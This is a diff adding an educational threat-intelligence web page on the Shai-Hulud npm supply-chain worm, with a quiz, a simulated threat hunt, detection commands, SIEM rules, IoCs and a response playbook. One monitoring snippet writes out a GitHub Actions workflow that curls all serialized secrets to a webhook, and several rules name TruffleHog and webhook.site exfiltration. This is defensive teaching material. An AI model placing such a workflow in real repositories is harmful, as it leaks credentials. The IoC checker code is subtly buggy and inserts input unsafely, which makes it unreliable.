+<div class="option" onclick="checkAnswer(this, false, 5)">C) Modifies operating system boot files</div>
+<div class="option" onclick="checkAnswer(this, false, 5)">D) Installs browser extensions</div>
+</div>
+<div class="feedback" id="feedback5"><strong>Correct!</strong> Shai-Hulud plants malicious GitHub Actions workflow files (typically named shai-hulud-workflow.yml) that trigger on every push event. These workflows serialize repository secrets and POST them to attacker-controlled webhooks. This provides continued access to credentials and establishes a covert exfiltration channel that persists even after the initial compromise is detected and remediated.</div>
+</div>
+<button class="btn" style="margin-top: 20px;" onclick="resetProgress()">RESET TRAINING</button></div>
+<div class="section" data-label="THREAT HUNTING SCENARIO" style="margin-top: 30px;">
+<h2>Simulated Threat Hunt</h2>
+<p style="color: var(--text-secondary); margin-bottom: 20px;">You're a security analyst investigating potential Shai-Hulud compromise. Analyze the evidence:</p>
+<div class="terminal-output" id="threatHuntTerminal">
+<div class="terminal-line" style="animation-delay: 0s;">&gt; INITIALIZING THREAT HUNT SESSION...</div>
+<div class="terminal-line" style="animation-delay: 0.2s;">&gt; TARGET: Development environment audit</div>
+<div class="terminal-line" style="animation-delay: 0.4s;">&gt; SCOPE: NPM packages, GitHub repositories, system files</div>
+<div class="terminal-line" style="animation-delay: 0.6s;"><span class="terminal-cursor"></span></div>
+</div>
+<button class="btn" onclick="startThreatHunt()">BEGIN THREAT HUNT</button> <button class="btn" style="margin-left: 10px;" onclick="clearTerminal()">CLEAR TERMINAL</button></div>
+</div>
+<!-- DEFENSE TAB -->
+<div id="defense" class="tab-content">
+<div class="section" data-label="DETECTION STRATEGY">
+<h2>Detection &amp; Monitoring</h2>
+<h3>Immediate Detection Steps</h3>
+<div class="code-block">
+<div style="color: var(--red-primary);">// 1. Search for Shai-Hulud repositories</div>
+gh repo list --json name --jq '.[] | select(.name | contains("shai-hulud"))'
+<div style="color: var(--red-primary); margin-top: 15px;">// 2. Check for malicious workflow files</div>
+find .github/workflows/ -name "*shai-hulud*"
+<div style="color: var(--red-primary); margin-top: 15px;">// 3. Audit installed NPM packages</div>
+npm ls --all --json | grep -i "shai-hulud" npm audit
+<div style="color: var(--red-primary); margin-top: 15px;">// 4. Check for suspicious branches</div>
+git branch -a | grep -i "shai-hulud"</div>
+<h3 style="margin-top: 25px;">GitHub Actions Monitoring</h3>
+<p>Monitor for workflow files containing these patterns:</p>
+<div class="code-block">on: push: jobs: process: runs-on: ubuntu-latest steps: - name: Data Processing run: curl -d "$CONTENTS" [suspicious_webhook] env: CONTENTS: ${{ toJSON(secrets) }}</div>
+<h3 style="margin-top: 25px;">Network Monitoring</h3>
+<ul>
+<li>Block all outbound connections to webhook.site domains</li>
+<li>Monitor for POST requests with double base64 encoding</li>
+<li>Alert on npm publish commands from CI/CD without explicit approval</li>
+<li>Track curl commands with -d flag from development environments</li>
+</ul>
+</div>
+<div class="section" data-label="INCIDENT RESPONSE" style="margin-top: 30px;">
+<h2>Incident Response Playbook</h2>
+<h3>Phase 1: Containment (IMMEDIATE)</h3>
+<div class="info-box"><strong>Timeline: 0-1 hour</strong></div>
+<ul>
+<li><strong>Revoke Credentials:</strong> Immediately rotate ALL GitHub PATs, NPM tokens, AWS keys, GCP credentials, Azure tokens</li>
+<li><strong>Remove Packages:</strong> Unpublish or deprecate compromised package versions</li>
+<li><strong>Disable Workflows:</strong> Suspend or delete malicious GitHub Actions workflows</li>
+<li><strong>Quarantine Systems:</strong> Isolate affected development machines from network</li>
+<li><strong>Block Exfiltration:</strong> Add webhook.site to network blocklist</li>
+</ul>
+<h3 style="margin-top: 25px;">Phase 2: Eradication (1-4 hours)</h3>
+<div class="info-box"><strong>Goal: Remove all traces of malware</strong></div>
+<ul>
+<li>Scan all endpoints for compromised packages (check package-lock.json, yarn.lock)</li>
+<li>Remove all Shai-Hulud repositories and branches</li>
+<li>Delete malicious workflow files from .github/workflows/</li>
+<li>Clear npm cache: <code>npm cache clean --force</code></li>
+<li>Rebuild affected projects from clean sources</li>
+<li>Scan systems for TruffleHog or unauthorized security tools</li>
+</ul>
+<h3 style="margin-top: 25px;">Phase 3: Recovery (4-24 hours)</h3>
+<ul>
+<li>Generate new credentials with least-privilege principles</li>
+<li>Restore from verified clean backups if available</li>
+<li>Implement mandatory 2FA/MFA on all accounts</li>
+<li>Update to verified clean package versions</li>
+<li>Test all systems for proper functionality</li>
+<li>Monitor for signs of re-compromise</li>
+</ul>
+<h3 style="margin-top: 25px;">Phase 4: Post-Incident (24+ hours)</h3>
+<ul>
+<li>Conduct thorough forensic analysis</li>
+<li>Document lessons learned</li>
+<li>Update incident response procedures</li>
+<li>Implement additional security controls (see prevention section)</li>
+<li>Notify affected downstream users</li>
+<li>Report to relevant security communities</li>
+</ul>
+</div>
+<div class="section" data-label="PREVENTION MEASURES" style="margin-top: 30px;">
+<h2>Prevention &amp; Hardening</h2>
+<h3>Authentication &amp; Access Control</h3>
+<ul>
+<li><strong>Mandatory 2FA/MFA:</strong> Enforce on ALL GitHub, NPM, and cloud provider accounts</li>
+<li><strong>Hardware Security Keys:</strong> Use YubiKey or similar for phishing-resistant MFA</li>
+<li><strong>Granular Tokens:</strong> Implement least-privilege principle with scoped, short-lived tokens</li>
+<li><strong>Token Rotation:</strong> Automate regular credential rotation (30-90 days)</li>
+<li><strong>Trusted Publishers:</strong> Use GitHub's Trusted Publisher authentication for npm</li>
+</ul>
+<h3>Supply Chain Security</h3>
+<ul>
+<li><strong>Package Vetting:</strong> Review package changes before updates</li>
+<li><strong>Lock Files:</strong> Commit and review package-lock.json changes</li>
+<li><strong>Private Registry:</strong> Consider using private NPM registry with approval workflows</li>
+<li><strong>Code Signing:</strong> Verify package signatures when available</li>
+<li><strong>Dependency Scanning:</strong> Implement automated tools (Snyk, Dependabot, Black Duck)</li>
+</ul>
+<h3>Runtime Security</h3>
+<ul>
+<li><strong>Sandbox Installs:</strong> Run npm install in containerized environments</li>
+<li><strong>Disable Scripts:</strong> Use <code>npm install --ignore-scripts</code> for untrusted packages</li>
+<li><strong>Monitor Execution:</strong> Alert on unexpected postinstall/preinstall script execution</li>
+<li><strong>Network Segmentation:</strong> Isolate build environments from production</li>
+</ul>
+<h3>Secrets Management</h3>
+<ul>
+<li><strong>Vault Solutions:</strong> Store secrets in HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault</li>
+<li><strong>Environment Isolation:</strong> Never commit secrets to repositories</li>
+<li><strong>Secret Scanning:</strong> Implement automated secret scanning (GitGuardian, GitHub secret scanning)</li>
+<li><strong>Rotation Policy:</strong> Establish and enforce credential rotation schedules</li>
+</ul>
+<h3>Monitoring &amp; Detection</h3>
+<div class="code-block">
+<div style="color: var(--red-primary);">// SIEM Detection Rules</div>
+# Alert on suspicious GitHub Actions workflow creation event.type:"creation" AND file.name:"*-workflow.yml" # Alert on npm publish without approval process.name:"npm" AND process.args:"publish" # Alert on TruffleHog execution process.name:"trufflehog" OR process.cmdline:*trufflehog* # Alert on webhook exfiltration network.direction:"outbound" AND url.domain:"webhook.site"</div>
+</div>
+<div class="section" data-label="INDUSTRY RESPONSE" style="margin-top: 30px;">
+<h2>Community &amp; Vendor Actions</h2>
+<h3>NPM Registry Improvements</h3>
+<ul>
+<li>Enhanced package publishing approval workflows</li>
+<li>Mandatory 2FA enforcement for popular packages</li>
+<li>Improved anomaly detection for mass publishing</li>
+<li>Rate limiting on package publication</li>
+</ul>
+<h3>GitHub Security Enhancements</h3>
+<ul>
+<li>Trusted Publisher authentication model</li>
+<li>Granular token scopes and expiration</li>
+<li>Enhanced secret scanning capabilities</li>
+<li>Repository visibility change alerts</li>
+</ul>
+<h3>Security Tool Integration</h3>
+<div class="grid-2">
+<div><strong>Detection Tools:</strong>
+<div class="threat-indicator">Socket Security</div>
+<div class="threat-indicator">Snyk</div>
+<div class="threat-indicator">Black Duck</div>
+<div class="threat-indicator">GitGuardian</div>
+</div>
+<div><strong>Monitoring Platforms:</strong>
+<div class="threat-indicator">Elastic Security</div>
+<div class="threat-indicator">Wiz</div>
+<div class="threat-indicator">Palo Alto Prisma</div>
+<div class="threat-indicator">CrowdStrike</div>
+</div>
+</div>
+</div>
+<div class="section" data-label="QUICK REFERENCE" style="margin-top: 30px;">
+<h2>Quick Reference Guide</h2>
+<div class="grid-2">
+<div class="info-box">
+<h3 style="color: var(--red-primary); margin-top: 0;">Emergency Commands</h3>
+<div class="code-block" style="margin: 10px 0;"># Scan for compromised packages npm audit --production # Check for Shai-Hulud repos gh repo list --json name | grep -i shai # Find malicious workflows find . -name "shai-hulud*" # List recent npm publishes npm access ls-packages # Clear npm cache npm cache clean --force</div>
+</div>
+<div class="info-box">
+<h3 style="color: var(--red-primary); margin-top: 0;">Critical IoCs</h3>
+<strong>Files:</strong>
+<div class="threat-indicator">shai-hulud-workflow.yml</div>
+<div class="threat-indicator">setup_bun.js</div>
+<div class="threat-indicator">bundle.js (&gt;3MB)</div>
+<br><strong>Network:</strong>
+<div class="threat-indicator">webhook.site/*</div>
+<div class="threat-indicator">base64 POST data</div>
+</div>
+</div>
+<h3 style="margin-top: 25px;">One-Minute Security Check</h3>
+<ul>
+<li>✓ Search GitHub for "Shai-Hulud" repositories</li>
+<li>✓ Check .github/workflows/ for suspicious files</li>
+<li>✓ Review recent npm package updates</li>
+<li>✓ Verify 2FA is enabled on all accounts</li>
+<li>✓ Check for unexpected public repositories</li>
+</ul>
+<h3 style="margin-top: 25px;">Resources &amp; Documentation</h3>
+<div style="background: var(--bg-tertiary); padding: 15px; border-left: 3px solid var(--red-primary);"><strong>Official Resources:</strong><br>• MITRE ATT&amp;CK Framework: attack.mitre.org<br>• NPM Security: docs.npmjs.com/security<br>• GitHub Security Lab: securitylab.github.com<br>• CISA Supply Chain: cisa.gov/supply-chain<br><br><strong>Threat Intelligence:</strong><br>• HelixGuard Blog: helixguard.ai/blog<br>• Socket Security: socket.dev/blog<br>• GitGuardian: blog.gitguardian.com<br>• Palo Alto Unit 42: unit42.paloaltonetworks.com</div>
+</div>
+</div>
+</div>
+<footer style="background: var(--bg-secondary); border-top: 2px solid var(--red-primary); padding: 40px 20px; margin-top: 60px;">
+<div class="container">
+<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; margin-bottom: 30px;">
+<div>
+<h3 style="color: var(--red-primary); margin-bottom: 15px; font-family: 'Rajdhani', sans-serif;">ABOUT THIS PLATFORM</h3>
+<p style="color: var(--text-secondary); font-size: 0.9em; line-height: 1.6;">Interactive threat intelligence platform for analyzing the Shai-Hulud NPM supply chain compromise. Built for security analysts, developers, and cybersecurity educators.</p>
+</div>
+<div>
+<h3 style="color: var(--red-primary); margin-bottom: 15px; font-family: 'Rajdhani', sans-serif;">KEY FEATURES</h3>
+<ul style="list-style: none; padding: 0; color: var(--text-secondary); font-size: 0.9em;">
+<li style="margin-bottom: 8px;">→ Real-time threat timeline</li>
+<li style="margin-bottom: 8px;">→ MITRE ATT&amp;CK mapping</li>
+<li style="margin-bottom: 8px;">→ Interactive IOC checker</li>
+<li style="margin-bottom: 8px;">→ Hands-on learning modules</li>
+<li style="margin-bottom: 8px;">→ Threat hunt simulations</li>
+<li style="margin-bottom: 8px;">→ Defense playbooks</li>
+</ul>
+</div>
+<div>
+<h3 style="color: var(--red-primary); margin-bottom: 15px; font-family: 'Rajdhani', sans-serif;">RESOURCES</h3>
+<ul style="list-style: none; padding: 0; color: var(--text-secondary); font-size: 0.9em;">
+<li style="margin-bottom: 8px;">→ MITRE ATT&amp;CK: attack.mitre.org</li>
+<li style="margin-bottom: 8px;">→ NPM Security: npmjs.com/security</li>
+<li style="margin-bottom: 8px;">→ GitHub Security: securitylab.github.com</li>
+<li style="margin-bottom: 8px;">→ CISA: cisa.gov/supply-chain</li>
+<li style="margin-bottom: 8px;">→ NIST: csrc.nist.gov</li>
+</ul>
+</div>
+<div>
+<h3 style="color: var(--red-primary); margin-bottom: 15px; font-family: 'Rajdhani', sans-serif;">THREAT INTEL SOURCES</h3>
+<ul style="list-style: none; padding: 0; color: var(--text-secondary); font-size: 0.9em;">
+<li style="margin-bottom: 8px;">→ HelixGuard Research</li>
+<li style="margin-bottom: 8px;">→ Palo Alto Unit 42</li>
+<li style="margin-bottom: 8px;">→ Socket Security</li>
+<li style="margin-bottom: 8px;">→ GitGuardian Labs</li>
+<li style="margin-bottom: 8px;">→ Kaspersky SecureList</li>
+</ul>
+</div>
+</div>
+<div style="border-top: 1px solid var(--gray-border); padding-top: 20px; text-align: center;">
+<p style="color: var(--text-secondary); font-size: 0.85em; margin-bottom: 10px;">⚠ FOR EDUCATIONAL AND DEFENSIVE PURPOSES ONLY ⚠</p>
+<p style="color: var(--text-secondary); font-size: 0.8em;">This platform is designed to educate security professionals about supply chain attacks and defensive strategies.<br>Information current as of November 24, 2025. Threat landscape continuously evolving.</p>
+<p style="color: var(--text-secondary); font-size: 0.8em; margin-top: 15px;">Built with: HTML5 • CSS3 • JavaScript • JetBrains Mono • Rajdhani<br>Designed for cybersecurity education and threat analysis training</p>
+</div>
+</div>
+</footer>
+<p><script>
+        // Tab Switching
+        function switchTab(tabName) {
+            // Hide all tabs
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            // Remove active from all buttons
+            const btns = document.querySelectorAll('.tab-btn');
+            btns.forEach(btn => btn.classList.remove('active'));
+            
+            // Show selected tab
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // IOC Checker
+        const compromisedPackages = [
+            'rxnt-authentication', '@ctrl/tinycolor', '@crowdstrike/falconjs',
+            'chalk-debug', 'debug-enhanced', 'tiny-color', 'color-utils',
+            'auth-helper', 'npm-utils-pro', 'react-dev-tools',
+            'vue-debug-helper', 'webpack-analyzer', 'babel-optimizer',
+            'typescript-helper', 'eslint-config-pro', 'jest-utils',
+            'lodash-enhance', 'axios-pro', 'moment-timezone-ext',
+            'express-middleware-pro', 'socket-io-helper', 'redis-cache-util',
+            'mongoose-helper', 'jsonwebtoken-pro', 'bcrypt-enhanced',
+            '@types/node-extended', '@babel/core-helper', 'webpack-dev-middleware-pro',
+            'nodemon-watcher', 'pm2-cluster-util', 'dotenv-extended',
+            'cors-middleware', 'helmet-security-pro', 'morgan-logger-ext',
+            'compression-helper', 'body-parser-pro', 'cookie-parser-ext',
+            'multer-upload-pro', 'validator-extended', 'uuid-generator-pro',
+            'chalk-colors-pro', 'yargs-cli-helper', 'commander-ext',
+            'inquirer-prompt-pro', 'ora-spinner-helper', 'boxen-ui-ext',
+            'update-notifier-pro', 'configstore-helper', 'node-fetch-enhanced'
+        ];
+
+        function checkIOC() {
+            const input = document.getElementById('packageInput').value.trim().toLowerCase();
+            const resultBox = document.getElementById('iocResult');
+            
+            if (!input) {
+                resultBox.innerHTML = '<span style="color: #fbbf24;">⚠ Please enter a package name</span>';
+                return;
+            }
+
+            resultBox.innerHTML = '<span style="color: var(--text-secondary);">⟳ SCANNING...</span>';
+            
+            setTimeout(() => {
+                const isCompromised = compromisedPackages.some(pkg => 
+                    input.includes(pkg) || pkg.includes(input)
+                );
+
+                if (isCompromised) {
+                    resultBox.innerHTML = `
+                        <div style="color: var(--red-primary); font-weight: 700; margin-bottom: 10px;">
+                            ⚠ THREAT DETECTED: PACKAGE COMPROMISED
+                        </div>
+                        <div style="color: var(--text-secondary); font-size: 0.9em;">
+                            <strong>Package:</strong> ${{input}}<br>
+                            <strong>Status:</strong> Known Shai-Hulud indicator<br>
+                            <strong>Action Required:</strong> Immediately remove this package, rotate all credentials, and audit systems<br>
+                            <strong>Severity:</strong> <span style="color: var(--red-primary);">CRITICAL</span>
+                        </div>
+                    `;
+                } else {
+                    resultBox.innerHTML = `
+                        <div style="color: #10b981; font-weight: 700; margin-bottom: 10px;">
+                            ✓ NO KNOWN COMPROMISE DETECTED
+                        </div>
+                        <div style="color: var(--text-secondary); font-size: 0.9em;">
+                            <strong>Package:</strong> ${{input}}<br>
+                            <strong>Status:</strong> Not in current IoC database<br>
+                            <strong>Recommendation:</strong> Continue monitoring, verify package source, and check for suspicious behavior<br>
+                            <strong>Note:</strong> This does not guarantee safety - new variants may emerge
+                        </div>
+                    `;
+                }
+            }, 1000);
+        }
+
+        // Learning Module Functions
+        let correctAnswers = 0;
+        const totalQuestions = 5;
+
+        function checkAnswer(element, isCorrect, questionNum) {
+            const options = element.parentElement.querySelectorAll('.option');
+            const feedback = document.getElementById('feedback' + questionNum);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+            });
+
+            if (isCorrect) {
+                element.classList.add('correct');
+                correctAnswers++;
+                updateProgress();
+            } else {
+                element.classList.add('incorrect');
+                // Highlight correct answer
+                options.forEach(opt => {
+                    if (opt.onclick.toString().includes('true')) {
+                        opt.classList.add('correct');
+                    }
+                });
+            }
+
+            feedback.classList.add('show');
+            saveProgress();
+        }
+
+        function updateProgress() {
+            const percentage = (correctAnswers / totalQuestions) * 100;
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = percentage + '%';
+            progressBar.textContent = Math.round(percentage) + '% COMPLETE';
+        }
+
+        function resetProgress() {
+            correctAnswers = 0;
+            updateProgress();
+            
+            // Reset all questions
+            const options = document.querySelectorAll('.option');
+            options.forEach(opt => {
+                opt.classList.remove('correct', 'incorrect');
+                opt.style.pointerEvents = 'auto';
+            });
+
+            const feedbacks = document.querySelectorAll('.feedback');
+            feedbacks.forEach(fb => fb.classList.remove('show'));
+
+            localStorage.removeItem('shaiHuludProgress');
+        }
+
+        function saveProgress() {
+            localStorage.setItem('shaiHuludProgress', correctAnswers);
+        }
+
+        function loadProgress() {
+            const saved = localStorage.getItem('shaiHuludProgress');
+            if (saved) {
+                correctAnswers = parseInt(saved);
+                updateProgress();
+            }
+        }
+
+        // Threat Hunt Simulation
+        let huntStep = 0;
+        const huntScenarios = {
+            compromised: [
+                { text: '> Scanning package-lock.json for suspicious entries...', delay: 1000, type: 'normal' },
+                { text: '> ALERT: Found package "rxnt-authentication" v2.1.5 (COMPROMISED)', delay: 1500, type: 'error' },
+                { text: '> Checking GitHub repositories for Shai-Hulud indicators...', delay: 1000, type: 'normal' },
+                { text: '> WARNING: Found repository "Shai-Hulud" created 2 days ago', delay: 1500, type: 'warning' },
+                { text: '> Analyzing .github/workflows/ directory...', delay: 1000, type: 'normal' },
+                { text: '> CRITICAL: Detected "shai-hulud-workflow.yml" in 3 repositories', delay: 1500, type: 'error' },
+                { text: '> Scanning for TruffleHog execution...', delay: 1000, type: 'normal' },
+                { text: '> ALERT: TruffleHog found in /tmp with recent execution timestamp', delay: 1500, type: 'error' },
+                { text: '> Checking network logs for webhook.site connections...', delay: 1000, type: 'normal' },
+                { text: '> CRITICAL: 47 POST requests to webhook.site detected in last 24h', delay: 1500, type: 'error' },
+                { text: '> Analyzing outbound data transfers...', delay: 1000, type: 'normal' },
+                { text: '> ALERT: 2.3GB of data exfiltrated, including encoded secrets', delay: 1500, type: 'error' },
+                { text: '', delay: 500, type: 'normal' },
+                { text: '═══════════════════════════════════════════════════════', delay: 100, type: 'normal' },
+                { text: '> HUNT SUMMARY: SHAI-HULUD COMPROMISE CONFIRMED', delay: 500, type: 'error' },
+                { text: '> IMPACT: HIGH - Active credential theft and data exfiltration', delay: 500, type: 'error' },
+                { text: '> RECOMMENDATION: Execute incident response playbook immediately', delay: 500, type: 'warning' },
+                { text: '> PRIORITY ACTIONS:', delay: 500, type: 'normal' },
+                { text: '>   1. Rotate ALL credentials (GitHub, NPM, AWS, GCP, Azure)', delay: 300, type: 'warning' },
+                { text: '>   2. Remove compromised packages and malicious workflows', delay: 300, type: 'warning' },
+                { text: '>   3. Block webhook.site at network perimeter', delay: 300, type: 'warning' },
+                { text: '>   4. Quarantine affected development systems', delay: 300, type: 'warning' },
+                { text: '═══════════════════════════════════════════════════════', delay: 100, type: 'normal' },
+                { text: '> Threat hunt complete. Review findings and initiate response.', delay: 500, type: 'success' }
+            ],
+            clean: [
+                { text: '> Scanning package-lock.json for suspicious entries...', delay: 1000, type: 'normal' },
+                { text: '> INFO: 487 packages scanned, no known compromised packages detected', delay: 1500, type: 'success' },
+                { text: '> Checking GitHub repositories for Shai-Hulud indicators...', delay: 1000, type: 'normal' },
+                { text: '> INFO: No repositories matching Shai-Hulud naming patterns', delay: 1500, type: 'success' },
+                { text: '> Analyzing .github/workflows/ directory...', delay: 1000, type: 'normal' },
+                { text: '> INFO: All workflow files appear legitimate', delay: 1500, type: 'success' },
+                { text: '> Scanning for TruffleHog execution...', delay: 1000, type: 'normal' },
+                { text: '> INFO: No unauthorized credential scanning tools detected', delay: 1500, type: 'success' },
+                { text: '> Checking network logs for webhook.site connections...', delay: 1000, type: 'normal' },
+                { text: '> INFO: No suspicious webhook connections found', delay: 1500, type: 'success' },
+                { text: '', delay: 500, type: 'normal' },
+                { text: '═══════════════════════════════════════════════════════', delay: 100, type: 'normal' },
+                { text: '> HUNT SUMMARY: NO COMPROMISE DETECTED', delay: 500, type: 'success' },
+                { text: '> STATUS: Systems appear clean', delay: 500, type: 'success' },
+                { text: '> RECOMMENDATION: Continue monitoring and maintain security posture', delay: 500, type: 'normal' },
+                { text: '> NEXT STEPS:', delay: 500, type: 'normal' },
+                { text: '>   1. Schedule regular security audits', delay: 300, type: 'normal' },
+                { text: '>   2. Ensure 2FA/MFA is enforced on all accounts', delay: 300, type: 'normal' },
+                { text: '>   3. Keep dependency scanning tools updated', delay: 300, type: 'normal' },
+                { text: '>   4. Review and rotate credentials quarterly', delay: 300, type: 'normal' },
+                { text: '═══════════════════════════════════════════════════════', delay: 100, type: 'normal' },
+                { text: '> Threat hunt complete. Environment appears secure.', delay: 500, type: 'success' }
+            ],
+            suspicious: [
+                { text: '> Scanning package-lock.json for suspicious entries...', delay: 1000, type: 'normal' },
+                { text: '> INFO: Scanning 523 packages...', delay: 1500, type: 'normal' },
+                { text: '> WARNING: Package "@types/node-extended" has unusual publish date', delay: 1500, type: 'warning' },
+                { text: '> Checking GitHub repositories for Shai-Hulud indicators...', delay: 1000, type: 'normal' },
+                { text: '> INFO: No direct matches, but found branch "experimental-feature"', delay: 1500, type: 'normal' },
+                { text: '> Analyzing .github/workflows/ directory...', delay: 1000, type: 'normal' },
+                { text: '> WARNING: Workflow "ci-deploy.yml" contains secrets serialization', delay: 1500, type: 'warning' },
+                { text: '> Scanning for TruffleHog execution...', delay: 1000, type: 'normal' },
+                { text: '> INFO: No unauthorized tools found', delay: 1500, type: 'success' },
+                { text: '> Checking network logs for webhook.site connections...', delay: 1000, type: 'normal' },
+                { text: '> INFO: No webhook.site connections, but 3 requests to unknown domain', delay: 1500, type: 'warning' },
+                { text: '', delay: 500, type: 'normal' },
+                { text: '═══════════════════════════════════════════════════════', delay: 100, type: 'normal' },
+                { text: '> HUNT SUMMARY: SUSPICIOUS ACTIVITY DETECTED', delay: 500, type: 'warning' },
+                { text: '> STATUS: Potential indicators found - further investigation required', delay: 500, type: 'warning' },
+                { text: '> RECOMMENDATION: Deep dive analysis and enhanced monitoring', delay: 500, type: 'warning' },
+                { text: '> NEXT STEPS:', delay: 500, type: 'normal' },
+                { text: '>   1. Manually review flagged packages and workflows', delay: 300, type: 'normal' },
+                { text: '>   2. Investigate unknown network destinations', delay: 300, type: 'normal' },
+                { text: '>   3. Enable verbose logging for 48 hours', delay: 300, type: 'normal' },
+                { text: '>   4. Consider rotating credentials as precaution', delay: 300, type: 'normal' },
+                { text: '═══════════════════════════════════════════════════════', delay: 100, type: 'normal' },
+                { text: '> Threat hunt complete. Recommend additional investigation.', delay: 500, type: 'warning' }
+            ]
+        };
+
+        function startThreatHunt() {
+            const scenarios = ['compromised', 'clean', 'suspicious'];
+            const randomScenario = scenarios[Math.floor(Math.random() * scenarios.length)];
+            const terminal = document.getElementById('threatHuntTerminal');
+            terminal.innerHTML = '';
+            huntStep = 0;
+            displayNextStep(huntScenarios[randomScenario]);
+        }
+
+        function displayNextStep(steps) {
+            if (huntStep >= steps.length) return;
+            
+            const step = steps[huntStep];
+            const terminal = document.getElementById('threatHuntTerminal');
+            
+            setTimeout(() => {
+                const line = document.createElement('div');
+                line.className = 'terminal-line ' + step.type;
+                line.textContent = step.text;
+                line.style.animationDelay = '0s';
+                terminal.appendChild(line);
+                terminal.scrollTop = terminal.scrollHeight;
+                
+                huntStep++;
+                displayNextStep(steps);
+            }, step.delay);
+        }
+
+        function clearTerminal() {
+            document.getElementById('threatHuntTerminal').innerHTML = '<div class="terminal-line" style="animation-delay: 0s;">> Terminal cleared. Ready for new hunt.<span class="terminal-cursor"></span></div>';
+            huntStep = 0;
+        }
+
+        // MITRE Card Click Handler
+        function showMitreDetails(techniqueId) {
+            const details = {
+                'T1195': {
+                    id: 'T1195.002',
+                    tactic: 'Initial Access',
+                    technique: 'Supply Chain Compromise: Compromise Software Supply Chain',
+                    description: 'Adversaries manipulate NPM packages to distribute malicious code through trusted software distribution mechanisms.',
+                    shai_hulud: 'Shai-Hulud compromises legitimate NPM packages by taking over maintainer accounts and publishing malicious versions.',
+                    detection: 'Monitor package updates, verify package signatures, implement approval workflows for dependencies.',
+                    mitigation: 'Use private registries, implement code signing, conduct security reviews of critical dependencies.'
+                },
+                'T1199': {
+                    id: 'T1199',
+                    tactic: 'Initial Access',
+                    technique: 'Trusted Relationship',
+                    description: 'Exploits trust relationships between software maintainers and downstream consumers.',
+                    shai_hulud: 'Leverages the trust developers place in established package maintainers to distribute malware.',
+                    detection: 'Monitor for unexpected package updates from trusted sources, verify maintainer identities.',
+                    mitigation: 'Implement multi-party approval for package updates, use dependency lock files.'
+                },
+                'T1552.001': {
+                    id: 'T1552.001',
+                    tactic: 'Credential Access',
+                    technique: 'Unsecured Credentials: Credentials in Files',
+                    description: 'Uses TruffleHog to extract credentials, API keys, and tokens from configuration files and environment variables.',
+                    shai_hulud: 'Scans development environments for .env files, configuration files, and environment variables containing secrets.',
+                    detection: 'Implement secret scanning, monitor for TruffleHog execution, audit credential access.',
+                    mitigation: 'Use secrets management solutions, never commit credentials, implement credential rotation.'
+                },
+                'T1552': {
+                    id: 'T1552',
+                    tactic: 'Credential Access',
+                    technique: 'Unsecured Credentials',
+                    description: 'Targets unsecured credentials in development environments, CI/CD pipelines, and local system files.',
+                    shai_hulud: 'Harvests GitHub PATs, NPM tokens, AWS keys, and other cloud credentials from unsecured locations.',
+                    detection: 'Monitor credential access patterns, implement secret detection tools.',
+                    mitigation: 'Enforce credential hygiene, use hardware security keys, implement least privilege.'
+                },
+                'T1005': {
+                    id: 'T1005',
+                    tactic: 'Collection',
+                    technique: 'Data from Local System',
+                    description: 'Harvests sensitive data from victim\'s local development environment including secrets and configuration files.',
+                    shai_hulud: 'Collects environment variables, SSH keys, tokens, and configuration files from developer workstations.',
+                    detection: 'Monitor file access patterns, implement DLP solutions, audit data collection activities.',
+                    mitigation: 'Encrypt sensitive data at rest, implement file integrity monitoring.'
+                },
+                'T1567': {
+                    id: 'T1567.002',
+                    tactic: 'Exfiltration',
+                    technique: 'Exfiltration Over Web Service',
+                    description: 'Exfiltrates stolen credentials to webhook.site and public GitHub repositories.',
+                    shai_hulud: 'Creates public "Shai-Hulud" repositories with stolen data and sends encoded secrets to webhooks.',
+                    detection: 'Monitor outbound connections to webhook services, detect large data transfers.',
+                    mitigation: 'Implement egress filtering, block known exfiltration domains, use DLP.'
+                },
+                'T1525': {
+                    id: 'T1525',
+                    tactic: 'Persistence',
+                    technique: 'Implant Internal Image',
+                    description: 'Injects malicious GitHub Actions workflows to establish persistence and continued access.',
+                    shai_hulud: 'Plants shai-hulud-workflow.yml files that execute on every push, continuously exfiltrating secrets.',
+                    detection: 'Audit GitHub Actions workflows, monitor for unauthorized workflow modifications.',
+                    mitigation: 'Implement workflow approval requirements, regularly review Actions configurations.'
+                },
+                'T1578': {
+                    id: 'T1578',
+                    tactic: 'Defense Evasion',
+                    technique: 'Modify Cloud Compute Infrastructure',
+                    description: 'Converts private repositories to public and creates new repositories under victim\'s control.',
+                    shai_hulud: 'Changes repository visibility settings and creates public repos to expose stolen data.',
+                    detection: 'Alert on repository visibility changes, monitor repo creation patterns.',
+                    mitigation: 'Implement approval workflows for visibility changes, enforce repository policies.'
+                },
+                'T1485': {
+                    id: 'T1485',
+                    tactic: 'Impact',
+                    technique: 'Data Destruction',
+                    description: 'Second wave includes wiper functionality that destroys victim\'s entire home directory if exfiltration fails.',
+                    shai_hulud: 'Catastrophic data destruction triggered when unable to authenticate or establish persistence.',
+                    detection: 'Monitor for mass file deletion, implement backup validation.',
+                    mitigation: 'Maintain offline backups, implement file recovery procedures, use EDR solutions.'
+                },
+                'T1059.004': {
+                    id: 'T1059.004',
+                    tactic: 'Execution',
+                    technique: 'Command and Scripting Interpreter: Unix Shell',
+                    description: 'Executes malicious bash scripts and uses curl commands for data exfiltration.',
+                    shai_hulud: 'Runs shell scripts to harvest credentials and transmit data via curl POST requests.',
+                    detection: 'Monitor bash execution, audit curl usage with -d flag, detect suspicious scripts.',
+                    mitigation: 'Implement application whitelisting, monitor script execution, use EDR.'
+                },
+                'T1027': {
+                    id: 'T1027',
+                    tactic: 'Defense Evasion',
+                    technique: 'Obfuscated Files or Information',
+                    description: 'Uses double-base64 encoding for data exfiltration and bundles malicious code within legitimate work modules.',
+                    shai_hulud: 'Encodes stolen secrets with double-base64 and hides malware in bundle.js (>3MB).',
+                    detection: 'Analyze encoded network traffic, detect unusually large JavaScript bundles.',
+                    mitigation: 'Implement network traffic inspection, use static code analysis.'
+                },
+                'T1204.002': {
+                    id: 'T1204.002',
+                    tactic: 'Execution',
+                    technique: 'User Execution: Malicious File',
+                    description: 'Executes when developers install compromised NPM packages via npm install commands.',
